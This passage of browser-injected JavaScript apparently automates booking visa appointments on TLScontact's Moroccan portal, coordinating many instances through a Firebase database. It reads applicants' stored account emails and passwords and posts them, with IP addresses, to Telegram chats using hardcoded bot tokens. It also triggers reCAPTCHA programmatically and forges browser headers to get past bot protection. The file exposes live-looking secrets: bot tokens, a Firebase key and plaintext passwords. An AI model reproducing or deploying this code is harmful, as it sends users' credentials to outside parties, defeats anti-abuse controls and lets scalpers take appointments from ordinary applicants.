  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1002013849559', text: call, parse_mode: 'html'}));
}
}, 5000);


  }




///////////////////////////////////////////////////////////////

////////// ESPACE FIREBASE /////////////                     ////////// ESPACE FIREBASE /////////////                ////////// ESPACE FIREBASE /////////////
////////// ESPACE FIREBASE /////////////                     ////////// ESPACE FIREBASE /////////////                ////////// ESPACE FIREBASE /////////////

////////// ESPACE FIREBASE /////////////                     ////////// ESPACE FIREBASE /////////////                ////////// ESPACE FIREBASE /////////////
////////// ESPACE FIREBASE /////////////                     ////////// ESPACE FIREBASE /////////////                ////////// ESPACE FIREBASE /////////////

////////// ESPACE FIREBASE /////////////                     ////////// ESPACE FIREBASE /////////////                ////////// ESPACE FIREBASE /////////////
////////// ESPACE FIREBASE /////////////                     ////////// ESPACE FIREBASE /////////////                ////////// ESPACE FIREBASE /////////////


//var apZp = document.createElement('script'); apZp.src = 'https://www.gstatic.com/firebasejs/8.8.1/firebase-app.js'; document.head.appendChild(apZp);
//var database = document.createElement('script'); database.src = 'https://www.gstatic.com/firebasejs/8.8.1/firebase-database.js'; document.head.appendChild(database);

var apZp = document.createElement('script');
apZp.src = 'https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js';
document.head.appendChild(apZp);

var database = document.createElement('script');
database.src = 'https://www.gstatic.com/firebasejs/8.2.9/firebase-database.js';
document.head.appendChild(database);

apZp.addEventListener('load', function () {
  database.addEventListener('load', function () {

    setTimeout(function(){
const firebaseConfig = {
  apiKey: "AIzaSyCwfh30GtaAmDzmsRrHxt1SNOK0T6UtKfc",
  authDomain: "tlscontactcs2.firebaseapp.com",
  databaseURL: "https://tlscontactcs2-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "tlscontactcs2",
  storageBucket: "tlscontactcs2.appspot.com",
  messagingSenderId: "73689253712",
  appId: "1:73689253712:web:017540a125e8acd7658e55"
};

   firebase.initializeApp(firebaseConfig);
    },5e3);

const fiAppointmentType2 = localStorage.getItem("fiAppointmentType"+localStorage.getItem("TLS_WEB_issuer"));
let typo2 = "";
var membre = localStorage.getItem("membre"+localStorage.getItem("TLS_WEB_issuer"));
      if ( membre  > 1 ) { var t = "F" } else { t = "I" }

if (fiAppointmentType2.includes("PRIMO") || fiAppointmentType2.includes("primo") || fiAppointmentType2.includes("Primo") || fiAppointmentType2.includes("privee") ) {
  typo2 = "PRIMO" + t + window.location.pathname.split("/")[3];
} else if (fiAppointmentType2.includes("VISE") || fiAppointmentType2.includes("vise") || fiAppointmentType2.includes("Vise") || fiAppointmentType2.includes("visé")) {
  typo2 = "VISE" + t + window.location.pathname.split("/")[3];
} else if (fiAppointmentType2.includes("Renouvellement") || fiAppointmentType2.includes("renouvellement") || fiAppointmentType2.includes("RENOUVELLEMENT")) {
  typo2 = "VISE" + t + window.location.pathname.split("/")[3];
} else if (fiAppointmentType2.includes("CIRCULATION") || fiAppointmentType2.includes("circulation") || fiAppointmentType2.includes("Circulation")) {
  typo2 = "CIRCULATION" + t + window.location.pathname.split("/")[3];
} else if (fiAppointmentType2.includes("Long Sejour") || fiAppointmentType2.includes("long sejour")) {
  typo2 = "Longsejour";
} else {
  typo2 = fiAppointmentType2.replace(/\s/g, "") + window.location.pathname.split("/")[3];
  console.log("null");
}
setTimeout(function(){

// Fonction pour envoyer un message via Firebase
function sendMessage(targetRegion) {
    const currentTime = new Date().getTime();
    const message = {
        text: `Switch to ${targetRegion}`,
        time: `${new Date().getUTCHours()} : ${new Date().getUTCMinutes()} : ${new Date().getUTCSeconds()}`,
        timo: currentTime
    };
    firebase.database().ref("RegionSwitch").push().set(message)
        .then(() => console.log("Message sent successfully"))
        .catch(error => console.error("Error sending message:", error));
}

// Ajouter les boutons dans le DOM
(function() {
    // Créer un conteneur pour les boutons
    const buttonContainer = document.createElement("div");
    buttonContainer.style.position = "fixed";
    buttonContainer.style.bottom = "10px";
    buttonContainer.style.right = "10px";
    buttonContainer.style.zIndex = "1000";
    buttonContainer.style.display = "flex";
    buttonContainer.style.gap = "10px";

    // Créer le bouton pour Oujda
    const buttonOujda = document.createElement("button");
    buttonOujda.textContent = "Oujda";
    buttonOujda.style.padding = "10px 20px";
    buttonOujda.style.cursor = "pointer";
    buttonOujda.style.backgroundColor = "#2196F3"; // Bleu
    buttonOujda.style.color = "white";
    buttonOujda.style.border = "none";
    buttonOujda.style.borderRadius = "5px";
    buttonOujda.style.fontSize = "14px";

    // Créer le bouton pour Casablanca
    const buttonCasablanca = document.createElement("button");
    buttonCasablanca.textContent = "Casablanca";
    buttonCasablanca.style.padding = "10px 20px";
    buttonCasablanca.style.cursor = "pointer";
    buttonCasablanca.style.backgroundColor = "#2196F3"; // Bleu
    buttonCasablanca.style.color = "white";
    buttonCasablanca.style.border = "none";
    buttonCasablanca.style.borderRadius = "5px";
    buttonCasablanca.style.fontSize = "14px";

    // Ajouter les boutons au conteneur
    buttonContainer.appendChild(buttonOujda);
    buttonContainer.appendChild(buttonCasablanca);

    // Ajouter le conteneur à la page
    document.body.appendChild(buttonContainer);

// Ajouter les événements pour les boutons avec confirmation
buttonOujda.addEventListener("click", () => {
    if (confirm("Are you sure you want to switch to Oujda?")) {
        console.log("Switching to Oujda...");
        sendMessage("maOUD2fr");
    } else {
        console.log("Action canceled.");
    }
});

buttonCasablanca.addEventListener("click", () => {
    if (confirm("Are you sure you want to switch to Casablanca?")) {
        console.log("Switching to Casablanca...");
        sendMessage("maCAS2fr");
    } else {
        console.log("Action canceled.");
    }
});

})();
      },1e3);

      ////////////////////////////////////////////////////////////////////////
      setTimeout(function(){
   // Écouter les messages Firebase pour synchroniser les actions
    firebase.database().ref("RegionSwitch").on("value", (snapshot) => {
        const data = snapshot.val(); // Récupérer les données de Firebase
        if (!data) return; // Si aucune donnée, ne rien faire

        // Récupérer les clés des messages
        const keys = Object.keys(data);
        // Récupérer le dernier message
        const lastMessage = data[keys[keys.length - 1]];

        if (!lastMessage) return; // Si aucun message valide, ne rien faire

        // Obtenir le temps actuel
        const currentTime = new Date().getTime();
        // Convertir le temps du dernier message en millisecondes
        const lastMessageTime = lastMessage.timo;
        // Calculer la différence de temps en secondes
        const timeDifferenceSeconds = (currentTime - lastMessageTime) / 1000;

        // Si le message est trop ancien (plus de 30 secondes), l'ignorer
        if (timeDifferenceSeconds >= 30) {
            console.log("Message expiré, aucune action requise.");
            return;
        }

        console.log("Message reçu :", lastMessage.text);

        // Déterminer la région cible à partir du message
        const targetRegion = lastMessage.text.split(" ")[2]; // Extrait "maCAS2fr" ou "maOUD2fr"
        console.log(targetRegion);

        // Vérifier si la région actuelle correspond à la région cible
        if (targetRegion && targetRegion !== window.location.pathname.split("/")[3]) {
            console.log(`Action : switch vers ${targetRegion}`);

                            // Ajouter un délai avant de rediriger
                setTimeout(() => {
                    // Effectuer le switch en modifiant l'URL
                    const newUrl = `https://fr.tlscontact.com/visa/ma/${targetRegion}/home?switch`;
                    console.log('Redirection vers :', newUrl);
                    window.location = newUrl;
                }, 10000); // Délai de 2 secondes pour laisser le temps à la déconnexion
        } else {
            console.log("Aucun switch nécessaire (même région ou message invalide).");
        }
    });

      },5e3);
    setTimeout(function(){
firebase.database().ref(typo2).on('value', function(snapshot) {
var DateValue = snapshot.val();

var lastMessageKey = null;
  var lastMessageText = null;
  var lastMessageTime = null;
  var lastMessageTimo = null;

  if (DateValue) {
    // Get the keys of all messages
    var messageKeys = Object.keys(DateValue);
    // Get the last message key
    lastMessageKey = messageKeys[messageKeys.length - 1];
    // Get the last message text
    lastMessageText = DateValue[lastMessageKey].text;
    // Get the last message time
    lastMessageTime = DateValue[lastMessageKey].time;
        // Get the last message time
    lastMessageTimo = DateValue[lastMessageKey].timo;
  }

  if (lastMessageKey != null) {
    console.log("Last Message Key:", lastMessageKey);
    console.log("Last Message Time:", lastMessageTime);
    console.log("Last Message Timo:", lastMessageTimo);

    console.log(lastMessageText);

      // Get the current time
var currentTime = new Date().getTime();

// Convert the last message time to milliseconds
var lastMessageTimeMillis = lastMessageTimo //new Date(lastMessageTimo).getTime();

// Calculate the time difference in seconds
var timeDifferenceSeconds = (currentTime - lastMessageTimeMillis) / 1000;
    console.log(timeDifferenceSeconds);

if (timeDifferenceSeconds < 45) {
  const dispo = document.querySelectorAll('button#save.tls-button-link');
  if (dispo.length > 0) {  console.log("button already exists");  }
                        else {
    console.log("dispo button creation");

  let consecutiveErrors = 0;

  const dateHourPairs = lastMessageText.split('\n');

//console.log(dateHourPairs);
dateHourPairs.forEach(pair => {
  const [date, hour] = pair.split(' ');

  const button = document.createElement('button');
  button.id = "save";
  button.innerText = `${date} ${hour}`;
  button.addEventListener('click', () => {
  document.getElementById("MOTIF").textContent = "DATABASE Date Selection Process: " + button.innerText;

// Ensure a new token is generated for each request
function getRecaptchaToken() {
    return new Promise((resolve, reject) => {
        grecaptcha.ready(function() {
            grecaptcha.execute('6LcTpXcfAAAAAM3VojNhyV-F1z92ADJIvcSZ39Y9', { action: 'book' }).then(function(token) {
                resolve(token);
            }).catch(function(error) {
                reject(error);
            });
        });
    });
}

        const fiAppointmentType = localStorage.getItem("fiAppointmentType"+localStorage.getItem("TLS_WEB_issuer"));
        const ref = window.location.pathname.split("/")[4];
        const center = window.location.pathname.split("/")[3];
        const country = window.location.pathname.split("/")[2];
        const formData = {};
      const cookieName = "XSRF-TOKEN";
const cookieValue = document.cookie.split('; ').find(row => row.startsWith(cookieName)).split('=')[1];
var f_xcopy_ug_type1 = localStorage.getItem("f_xcopy_ug_type"+localStorage.getItem("TLS_WEB_issuer"));
var index = 0;
              function Submitable(token) {
                    if (index < 1) {
    let requestStartTime = performance.now();

            // Générer les headers dynamiquement
            function getHeaders(token) {
                const uaData = navigator.userAgentData || {};
                return {
                    "accept": "application/json, text/plain, */*",
                    "accept-language": navigator.languages ? navigator.languages.join(", ") : "fr-FR, fr;q=0.9, en-US;q=0.8, en;q=0.7",
                    "content-length": "0",
                    "content-type": "application/json",
                    "dnt": "1",
                    "origin": "https://fr.tlscontact.com",
                    "priority": "u=1, i",
                    "recaptcha-token": token,
                    "sec-ch-ua": uaData.brands
                        ? uaData.brands.map(b => `"${b.brand}";v="${b.version}"`).join(", ")
                        : `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
                    "sec-ch-ua-arch": uaData.architecture || "x86",
                    "sec-ch-ua-bitness": uaData.bitness || "64",
                    "sec-ch-ua-full-version": `"${navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "131.0.6778.266"}"`,
                    "sec-ch-ua-full-version-list": uaData.fullVersionList
                        ? uaData.fullVersionList.map(b => `"${b.brand}";v="${b.version}"`).join(", ")
                        : `"Google Chrome";v="${navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "131.0.6778.266"}", "Chromium";v="${navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "131.0.6778.266"}", "Not_A Brand";v="24.0.0.0"`,
                    "sec-ch-ua-mobile": uaData.mobile ? "?1" : "?0",
                    "sec-ch-ua-platform": uaData.platform || "Windows",
                    "sec-ch-ua-platform-version": `"15.0.0"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": navigator.userAgent,
                    "x-xsrf-token": cookieValue
                };
            }


fetch(`https://fr.tlscontact.com/services/customerservice/api/tls/appointment/book?client=fr&issuer=${center}&formGroupId=${ref}&timeslot=${date}%20${hour}&appointmentType=${fiAppointmentType}&accountType=INDI&lang=fr-fr`, {
  method: "POST",
  headers : getHeaders(token),
  referrer: "https://fr.tlscontact.com/appointment/"+country+"/"+center+"/"+ref,
})
.then(response => {

            let requestEndTime = performance.now();
            let requestDuration = ((requestEndTime - requestStartTime) / 1000).toFixed(3);
            console.log(`Request took: ${requestDuration} s`);
            console.log(`Page has been active for: ${getPageActiveTime()} s`);

    const now = new Date();
const hours = now.getUTCHours();
const minutes = now.getUTCMinutes();
const seconds = now.getUTCSeconds();

    const call = "Database : " + window.location.pathname.split("/")[1] +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + button.innerText + "\nSataus : " + response.status + "\nRequest took  :  " +  requestDuration + " s" + "\nActive for  :  " + getPageActiveTime() + " s" + "\nTimer : " +  hours + " : " + minutes + " : " + seconds  + "\n" +     localStorage.getItem("IP") ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001932938808', text: call, parse_mode: 'html'}));


        if (response.status === 429) {
             document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
             document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
                    setTimeout(function () {  window.location.href = window.location.href; }, 1333e3);
}
            else
        if (response.status === 403) {
             document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
             document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
            setTimeout(function () {  window.location.href = window.location.href; }, 33e3);
 }
            else
        if (response.status === 401) {  console.error("statut : " + response.status); document.getElementById("MOTIF").textContent = "votre table statut : reload " + response.status;
setTimeout(function () {  window.location.href = window.location.href; }, 2e3); }
                            else
if (response.status === 400) {
        consecutiveErrors++;
        console.error(`Erreur 400 détectée : ${consecutiveErrors} fois consécutivement.`);
        response.text().then(errorText => {
            console.error(`Statut : ${response.status} - ${errorText}`);
            document.getElementById("MOTIF").textContent = `Votre Book statut : ${response.status} - ${errorText}`;
            const element = document.querySelector('#MOTIF');element.style.backgroundColor = 'red';
                    const removedButtons = document.querySelectorAll('.tls-button-link');
                    if (removedButtons.length > 1) {

                        if (consecutiveErrors >= 2) {
            console.warn("Trop d'erreurs 400 consécutives. Arrêt des tentatives de clics.");
                console.log("Réinitialisation des erreurs et actualisation de la page...");
                        setTimeout(() => { location.reload(); }, 100000);
                        }
                            else {
                        let randomIndex = Math.floor(Math.random() * removedButtons.length);
                        const randomButton = removedButtons[randomIndex];
                        console.log("Tentative de clic sur un bouton disponible...");
                        setTimeout(() => { randomButton.click(); }, 1000);
                     } }
        }).catch(err => console.error("Erreur lors de la lecture du texte de la réponse :", err));
    }

            else
        if (response.status === 500) {
     document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
     setTimeout(function(){            setTimeout(function(){ const intervalIdBut = setInterval(() => {
  const removedButtons = document.querySelectorAll('.tls-button-link')
  if (removedButtons.length > 1) {
    clearInterval(intervalIdBut);
let previousIndex = -1; // initialize previousIndex to an invalid value
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;
    const randomButton = removedButtons[randomIndex];
 //setTimeout(function(){   randomButton.click(); },1e3);
}  else { /*setTimeout(function(){ window.location.href = window.location },5e3); */}
}, 1000); },1e3); },5e3); }
                    else
        if ([502, 503, 504].includes(response.status)) {
     document.getElementById("MOTIF").textContent = "votre book statut : " + response.status;
setTimeout(function(){            setTimeout(function(){ const intervalIdBut = setInterval(() => {
  const removedButtons = document.querySelectorAll('.tls-button-link')
  if (removedButtons.length > 1) {
    clearInterval(intervalIdBut);
let previousIndex = -1; // initialize previousIndex to an invalid value
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;
    const randomButton = removedButtons[randomIndex];
 setTimeout(function(){   randomButton.click(); },2e3);
}  else { setTimeout(function(){ window.location.href = window.location },5e3); }
}, 500); },500); },1e3); }
                        else
        if (response.status === 404 && consecutiveErrors < 1 ) {
               document.getElementById("MOTIF").textContent = "Votre book_appointment_fail || retry process";
const element = document.querySelector('#MOTIF');element.style.backgroundColor = 'red';
  const removedButtons = document.querySelectorAll('.tls-button-link');

        const call = " DATABASE Selection" +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.error  + "\n" +     localStorage.getItem("IP") ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001932938808', text: call, parse_mode: 'html'}));

 setTimeout(function(){ location.reload(); },120e3);

      if (removedButtons.length > 9) {
consecutiveErrors++;
 setTimeout(function(){ location.reload(); },120e3);
let previousIndex = -1; // initialize previousIndex to an invalid value
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;    const randomButton = removedButtons[randomIndex];  const randomButton2 = removedButtons[Math.floor(Math.random() * removedButtons.length)];
setTimeout(function(){  randomButton2.click(); },1e3);
}
            else {
  consecutiveErrors++;
 setTimeout(function(){ location.reload();  },80e3);
let previousIndex = -1;
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;    const randomButton = removedButtons[randomIndex];
//setTimeout(function(){  randomButton.click(); },3e3);
 }
                                     }

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

else
  if (response.status === 200) {
    response.json().then(result => {

        setTimeout(function(){window.location.href = "https://fr.tlscontact.com/personal/"+ window.location.pathname.split("/")[2] + "/" + window.location.pathname.split("/")[3] + "/" + localStorage.getItem("TLS_WEB_formGroupId");   },180e3);

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

if (result.error === "book_appointment_fail" || result.error === "unknown_error" && consecutiveErrors < 3 ) {
    document.getElementById("MOTIF").textContent = "Votre book_appointment_fail || retry process";
const element = document.querySelector('#MOTIF');element.style.backgroundColor = 'red';
  const removedButtons = document.querySelectorAll('.tls-button-link');
      if (removedButtons.length > 2) {
consecutiveErrors++;
 setTimeout(function(){ location.reload(); },120e3);
let previousIndex = -1; // initialize previousIndex to an invalid value
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;    const randomButton = removedButtons[randomIndex];
setTimeout(function(){  randomButton.click(); },3e3);
}  else {
  consecutiveErrors++;
 setTimeout(function(){ location.reload();  },80e3);
let previousIndex = -1; // initialize previousIndex to an invalid value
let randomIndex = Math.floor(Math.random() * removedButtons.length);
while (randomIndex === previousIndex) {  randomIndex = Math.floor(Math.random() * removedButtons.length);}
previousIndex = randomIndex;    const randomButton = removedButtons[randomIndex];
randomButton.click(); }
}
        else
if (result.message === "book appointment success") {

    localStorage.setItem("SUCCESS", 1);

    document.getElementById("MOTIF").textContent = "book appointment success";
var emailloc = localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"));
var pwdloc = localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));
var number = localStorage.getItem("membre"+localStorage.getItem("TLS_WEB_issuer"));
localStorage.setItem("done", "1" );

function execute3() {
  if ( pwdloc === 'Casa2000@' ) {
    setTimeout(function(){
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001955074728', text: call, parse_mode: 'html'}));
                      }, 66e3);   }
  else if ( pwdloc === 'Visa2022@'  || pwdloc === 'Visa2024@' ) {
       setTimeout(function(){
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001925051993', text: call, parse_mode: 'html'}));
                      }, 66e3);   }

else if ( pwdloc === 'Mohamed@33@' ) {
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001880026679', text: call, parse_mode: 'html'}));
}

else if ( pwdloc === 'Oujda123456789*' ) {
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1002101071692', text: call, parse_mode: 'html'}));
}
else if ( pwdloc === 'Khalid@33@' ) {
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1002013849559', text: call, parse_mode: 'html'}));
}
  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + date + " _ " + hour + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) + "\n" +     localStorage.getItem("IP") ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST', `https://api.telegram.org/bot${'6223103817:AAHHIdm38j0ATKM_JNJajeG3vWFHHei-Szs'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onload = function() {
    if (xhr.status === 200) {
document.getElementById("MOTIF").textContent = "Appointement has been sent Successfuly";
document.title = "Appointement has been sent Successfuly";
if (window.location.href.indexOf("ma") > -1) {
  setTimeout(function(){ window.location.href =  "https://fr.tlscontact.com/checkout/ma/"+window.location.pathname.split("/")[3] + "/" + localStorage.getItem("refi"+localStorage.getItem("TLS_WEB_issuer"))  }, 133e3);
};
const element = document.querySelector('#MOTIF');
element.style.backgroundColor = 'green';
    } else {
   setTimeout(function(){   execute3();  },33e3);
    }
  };
  xhr.onerror = function() {
   setTimeout(function(){   execute3();  },33e3);
  };
  xhr.send(`chat_id=-1001732653163&text=${call}&parse_mode=html`);
};
execute3();

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

      }
        else {       }
    });
  } else {
    showError("La requête a échoué avec le code d'erreur : " + response.status);
  }
})
.catch(error => {
  showError("Une erreur s'est produite lors de l'envoi de la requête : " + error.message);
});

 }}

      // Example usage:
getRecaptchaToken().then(token => {
   setTimeout(function(){ Submitable(token); },100);
}).catch(error => {
    console.error("Error obtaining reCAPTCHA token:", error);
    document.getElementById("MOTIF").textContent = `Error obtaining reCAPTCHA token: ${error.message}`;
    getRecaptchaToken();
});
});
 if ( date.includes("2025")  ) {

var object = document.querySelector(".tls-status-card-info.one-cell");
var object2 = document.querySelector(".tls-appointment-legends");
var object3 = document.querySelector(".tls-simple-banner");
if ( window.location.pathname.split("/")[1] == 'inquiry' ) {
object3.appendChild(button);
}
if ( window.location.pathname.split("/")[1] == 'personal' ) {
object.appendChild(button);
}
if ( window.location.pathname.split("/")[1] == 'appointment' ) {
object2.appendChild(button);
}

     } else {
console.log("nothing happen");}

const today = new Date();
today.setDate(today.getDate() + 2);
const futureDate = today.toISOString().substring(0, 10);

// Get all the save buttons
const saveButtons = document.querySelectorAll('button#save');

// Loop through the buttons and check their date
saveButtons.forEach(button => {
  const buttonText = button.textContent.trim();
  const buttonDate = new Date(buttonText);
  const compareDate = new Date(futureDate);

  if (buttonDate > compareDate) {
    // Add the green link style to the button if its date is before or equal to the futureDate
    button.classList.add('tls-button-link');
    button.style.color = "green";
  } else {
        // Remove the button if its date is after the futureDate
    button.remove();

  }





  });

}) }} else {
  console.log("expire");
}

    // Stop further execution of the function here if needed
    return;
  }

})
            },5e3);
 });
});



////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////


////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////



////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

if (window.location.href.includes('cloudflare')) {
    console.log("Waiting for Cloudflare verification...");
    
setTimeout(() => {
    if (document.title !== 'tlscontact.com' && 
        document.title !== 'Un instant…' && 
        document.title !== 'Just a moment...') {
        console.log("Page loaded successfully ");
        window.close();
    } else {
        console.error("Error: Missing required 'client' parameter.");
        
    }
}, 5000); 
}

if (document.title !== 'tlscontact.com' && document.title !== 'Un instant…' && document.title !== 'Just a moment...') {
    
setTimeout(function(){
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;
    localStorage.setItem("IP" , ipAddress);
       if ( window.location.pathname.split("/")[1] == 'personal' ) {
    console.log('Your IP address is: ' + ipAddress); setTimeout(function(){ document.title = ipAddress }, 10000);
}
else if ( window.location.pathname.split("/")[1] == 'appointment' ) {
    console.log('Your IP address is: ' + ipAddress); setTimeout(function(){ document.title = ipAddress }, 10000);
}
       else {
    console.log('Your IP address is: ' + ipAddress); setTimeout(function(){ document.title = ipAddress }, 10000);
       }
  })
  .catch(error => {
    console.error('Error fetching IP address:', error);
  });
}, 1000);



// Fonction pour réserver un rendez-vous

// Fonction pour réserver un rendez-vous

  // Créer le bouton
  // Créer le bouton
  // Créer le bouton
  // Créer le bouton
  // Créer le bouton

setTimeout(function(){
 // Créer le bouton
var bookButton = document.createElement("button");
bookButton.id = "bookButton";
bookButton.innerText = "Book Appointment";

// Ajouter le bouton au-dessus de l'élément avec la classe tls-appointment-content
    if (window.location.pathname.split("/")[1] == 'appointment') {
var appointmentContent = document.querySelector(".tls-appointment-content");
appointmentContent.parentNode.insertBefore(bookButton, appointmentContent);
    }else if (window.location.pathname.split("/")[1] == 'personal') {
 appointmentContent = document.querySelector(".tls-inquiry-form");
appointmentContent.parentNode.insertBefore(bookButton, appointmentContent);
    }
// Fonction pour réserver un rendez-vous
if (window.location.pathname.split("/")[1] == 'personal' , 'appointment') {

    // Store the time when the page is loaded
let pageStartTime = performance.now();

// Function to track the time the page has been active
function getPageActiveTime() {
    return ((performance.now() - pageStartTime) / 1000).toFixed(3); // Convert to seconds
}

